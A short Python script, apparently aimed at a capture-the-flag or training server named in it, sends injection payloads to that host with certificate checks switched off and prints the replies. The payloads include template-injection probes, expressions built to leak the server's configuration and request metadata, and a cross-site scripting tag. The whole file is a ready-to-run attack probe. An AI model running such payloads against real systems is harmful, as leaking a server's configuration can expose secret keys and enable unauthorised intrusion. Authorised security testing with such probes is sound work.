import requests
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target URL
url = "https://cybercrusade.helb-prigogine.be:8111/"
headers = {"Content-Type": "application/text"}

# Test payloads with labels
payload_tests = {
    "SSTI Test": "{{7*7}}",
    "CSRF Test": "CSRF test from Python",
    "Config Leak Test": "{{config.items()}}",
    "Request Meta Test": "{{request.META}}",
    "XSS Test": "<script>alert(\"XSS\")</script>",
}

for label, payload in payload_tests.items():
    response = requests.get(url, headers=headers, data=payload, verify=False)
    print(f"[{label}] Payload: {payload}")
    print(f"Status Code: {response.status_code}")
    print(f"Response: {response.text}\n")
